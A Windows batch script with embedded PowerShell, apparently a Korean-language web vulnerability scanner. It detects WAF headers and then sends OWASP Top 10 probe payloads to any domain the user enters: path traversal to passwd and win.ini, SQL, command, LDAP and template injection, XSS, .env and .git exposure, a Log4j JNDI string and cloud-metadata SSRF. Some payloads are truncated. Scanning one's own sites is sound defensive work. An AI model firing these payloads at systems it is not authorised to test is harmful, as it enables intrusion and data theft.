@echo off
setlocal
:: [필수] 콘솔을 UTF-8 모드로 변경
chcp 65001 >nul

:: [창 위치/크기 설정]
mode con: cols=150 lines=60
powershell -Command "$w=Add-Type -Name W -PassThru -MemberDefinition '[DllImport(\"user32.dll\")]public static extern bool SetWindowPos(IntPtr h,IntPtr i,int x,int y,int w,int h2,uint f);';$w::SetWindowPos((Get-Process -Id $PID).MainWindowHandle,0,0,0,0,0,65)"

title Web Security Scanner v18.5 (Sorted by A01-A10)

:MAIN_MENU
cls
echo.
echo ========================================================
echo   🛡️ 웹 종합 보안 진단 도구 v18.5 (번호순 정렬)
echo ========================================================
echo.
echo   [안내] 진단할 대상 도메인을 입력하세요.
echo   (예: shop-t1.gg)
echo.

set /p TARGET_INPUT="[입력] 주소 >> "
if "%TARGET_INPUT%"=="" goto MAIN_MENU

set "TARGET_DOMAIN=%TARGET_INPUT%"

echo.
echo [1] 진단 엔진 구동 중... (A01부터 순서대로 진행합니다)
echo -------------------------------------------------------------------------

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$me = Get-Content '%~f0' -Encoding UTF8; "^
    "$start = 0; "^
    "for ($i=0; $i -lt $me.Count; $i++) { if ($me[$i] -eq ':__START_PS__') { $start = $i + 1; break } }; "^
    "$code = $me[$start..($me.Count-1)] -join [Environment]::NewLine; "^
    "Invoke-Expression $code"

echo.
echo ========================================================
pause
goto :EOF

:: =========================================================================
::  ▼ 파워쉘 코드 영역 (배열 순서 A01 -> A10 정렬됨) ▼
:: =========================================================================
:__START_PS__

$ErrorActionPreference = 'SilentlyContinue'
$rawInput = $env:TARGET_DOMAIN
if ([string]::IsNullOrWhiteSpace($rawInput)) { exit }
if ($rawInput -notmatch '^http') { $target = 'https://' + $rawInput.Trim() } else { $target = $rawInput.Trim() }
$ua = 'Mozilla/5.0 (compatible; SecurityCheck/18.5)'

try {
    # 1. 기본 연결 및 WAF 탐지
    $req = Invoke-WebRequest -Uri $target -UserAgent $ua -UseBasicParsing -TimeoutSec 5
    $headers = $req.Headers
    
    Write-Host ('   - 대상 URL : ' + $target)
    Write-Host ''
    Write-Host '   [1] WAF(웹 방화벽) 브랜드 탐지'
    
    $wafFound = $false
    $wafSignatures = @{
        'Cloudflare' = 'server:cloudflare|__cfduid';
        'AWS WAF'    = 'x-amz-cf-id|x-amzn-trace-id';
        'Akamai'     = 'x-akamai|akamai-ghost';
        'Imperva'    = 'x-cdn:imperva|incap_ses';
        'Azure FrontDoor' = 'x-azure-ref';
    }

    foreach($waf in $wafSignatures.Keys){
        $sig = $wafSignatures[$waf]
        if(($headers.ToString() -match $sig) -or ($req.Content -match $sig)){
            Write-Host ('     ✅ 탐지됨 : ' + $waf + ' (방화벽이 존재합니다)') -ForegroundColor Cyan
            $wafFound = $true
        }
    }
    if(-not $wafFound){
        Write-Host '     ⚠️ 탐지 실패 : 알려진 상용 WAF 헤더가 없습니다.' -ForegroundColor Gray
    }

    Write-Host ''
    Write-Host '   [2] OWASP Top 10 순차 정밀 진단 (10초 간격 / 무소음)'
    Write-Host '   -------------------------------------------------------'

    # [정렬됨] A01 -> A03 -> A05 -> A06 -> A10
    $attacks = @(
        # [A01] Broken Access Control (1위)
        @{Code='[A01]'; Rank='1위 '; Cat='접근 통제 취약'; Name='Path Traversal'; Payload='?file=../../../../passwd'; Check='root:x:0:0'; Intent='시스템 파일 열람 시도'; Risk='설정 파일 유출'},
        @{Code='[A01]'; Rank='1위 '; Cat='접근 통제 취약'; Name='Path Bypass  '; Payload='?file=....//....//passwd'; Check='root:x:0:0'; Intent='방화벽 우회 경로 탐색'; Risk='방화벽 무력화'},
        @{Code='[A01]'; Rank='1위 '; Cat='접근 통제 취약'; Name='Path Trav(Win)'; Payload='?file=../../windows/win.ini'; Check='[fonts]'; Intent='윈도우 시스템 파일 접근'; Risk='윈도우 설정 유출'},

        # [A03] Injection (3위)
        @{Code='[A03]'; Rank='3위 '; Cat='인젝션 공격   '; Name='SQL Injection'; Payload='?id=1 UNION SELECT 1...'; Check='UNION SELECT'; Intent='DB 조작 및 정보 탈취'; Risk='회원정보 유출, DB 삭제'},
        @{Code='[A03]'; Rank='3위 '; Cat='인젝션 공격   '; Name='XSS (Script) '; Payload='?q=<script>alert(1)</script>'; Check='<script>'; Intent='스크립트 실행 공격'; Risk='쿠키 탈취, 피싱'},
        @{Code='[A03]'; Rank='3위 '; Cat='인젝션 공격   '; Name='Cmd Injection'; Payload='?cmd=; cat /etc/passwd'; Check='root:x:0:0'; Intent='서버 명령어 직접 실행'; Risk='서버 권한 장악'},
        @{Code='[A03]'; Rank='3위 '; Cat='인젝션 공격   '; Name='LDAP Inject  '; Payload='?user=*)(uid=*))(|(uid=*'; Check='uid='; Intent='관리자 인증 우회'; Risk='관리자 계정 탈취'},
        @{Code='[A03]'; Rank='3위 '; Cat='인젝션 공격   '; Name='SSTI Template'; Payload='?name={{7*7}}'; Check='49'; Intent='템플릿 엔진 계산 실행'; Risk='내부 파일 열람, RCE'},

        # [A05] Security Misconfiguration (5위)
        @{Code='[A05]'; Rank='5위 '; Cat='보안 설정 오류'; Name='Config (.env)'; Payload='/.env'; Check='DB_PASSWORD'; Intent='환경 설정 파일 탐색'; Risk='DB 비밀번호 노출'},
        @{Code='[A05]'; Rank='5위 '; Cat='보안 설정 오류'; Name='Git Exposure '; Payload='/.git/HEAD'; Check='refs/heads'; Intent='소스코드 저장소 탐색'; Risk='소스코드 전체 유출'},

        # [A06] Vulnerable Components (6위)
        @{Code='[A06]'; Rank='6위 '; Cat='취약한 구성요소'; Name='Log4j (RCE)  '; Payload='?q=${jndi:ldap://...}'; Check='Reference Class'; Intent='Log4j 취약점 공격'; Risk='관리자 권한 장악'},

        # [A10] SSRF (10위)
        @{Code='[A10]'; Rank='10위'; Cat='서버 위조 요청'; Name='SSRF (Cloud) '; Payload='?url=http://169.254...'; Check='ami-id'; Intent='클라우드 내부망 호출'; Risk='AWS 인증키 탈취'}
    )

    $cntBlocked = 0
    $cntSanitized = 0
    $cntVuln = 0
    $total = $attacks.Count
    $current = 0

    foreach($atk in $attacks){
        $current++
        
        # [1] Header Line
        Write-Host "   $($atk.Code) " -NoNewline -ForegroundColor Cyan
        Write-Host "(위험순위 : $($atk.Rank)) " -NoNewline -ForegroundColor Yellow
        Write-Host "(카테고리 : $($atk.Cat)) " -NoNewline -ForegroundColor Green
        Write-Host "$($atk.Name)" -ForegroundColor White
        
        # [2] Payload
        Write-Host "      └─ 공격: $($atk.Payload)" -ForegroundColor DarkGray

        # [3] Desc & Risk
        Write-Host "      └─ 설명: $($atk.Intent)" -NoNewline -ForegroundColor Gray
        Write-Host " / 위험: $($atk.Risk)" -ForegroundColor DarkRed
        
        # [4] Result
        $testUrl = $target + $atk.Payload
        Write-Host "      👉 결과: " -NoNewline

        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $req = Invoke-WebRequest -Uri $testUrl -UserAgent $ua -UseBasicParsing -TimeoutSec 5
            $code = $req.StatusCode
            $content = $req.Content
            
            if($code -ge 400){
                 $cntBlocked++
                 Write-Host "$code [🛡️ 차단됨] (안전)" -ForegroundColor Cyan
            } else {
                 if($content -match 'blocked|rejected|denied|security|waf|access|forbidden') {
                     $cntBlocked++
                     Write-Host "$code [🛡️ 차단됨] (경고 메시지)" -ForegroundColor Cyan
                 } 
                 elseif ($content.IndexOf($atk.Check) -ge 0) {
                     $cntVuln++
                     $msg = "$code [🚨 뚫림/노출] (위험!)"
                     if ($atk.Name -match 'SSTI') { $msg = "$code [🚨 뚫림/계산됨] (위험!)" }
                     Write-Host $msg -ForegroundColor Red
                 }
                 else {
                     $cntSanitized++
                     Write-Host "$code [✅ 무해화됨] (안전)" -ForegroundColor Green
                 }
            }
        } catch {
            $errCode = $_.Exception.Response.StatusCode.value__
            if($errCode){ 
                $cntBlocked++
                Write-Host "$errCode [🛡️ 차단됨] (접속 거부)" -ForegroundColor Cyan
            }
            else { 
                Write-Host "[연결 오류] (응답 없음)" -ForegroundColor DarkGray
            }
        }
        
        # [Silent Delay]
        if ($current -lt $total) {
            Start-Sleep -Seconds 5
            Write-Host ""
        }
    }

    Write-Host ""
    Write-Host ""
    
    # [요약 리포트]
    Write-Host "   📊 [보안 진단 요약 리포트]" -ForegroundColor White
    Write-Host "   =======================================================" -ForegroundColor DarkGray
    Write-Host "    • 총 점검 항목 : " -NoNewline; Write-Host "$($attacks.Count) 개" -ForegroundColor White
    Write-Host "    • 🛡️ 완벽 방어 : " -NoNewline; Write-Host "$cntBlocked 개" -ForegroundColor Cyan
    Write-Host "    • ✅ 무해화    : " -NoNewline; Write-Host "$cntSanitized 개" -ForegroundColor Green
    Write-Host "    • 🚨 취약/위험 : " -NoNewline; Write-Host "$cntVuln 개" -ForegroundColor Red
    Write-Host "   =======================================================" -ForegroundColor DarkGray
    Write-Host ""

} catch {
    Write-Host ('   [!] 접속 실패: ' + $_.Exception.Message) -ForegroundColor Red
    exit
}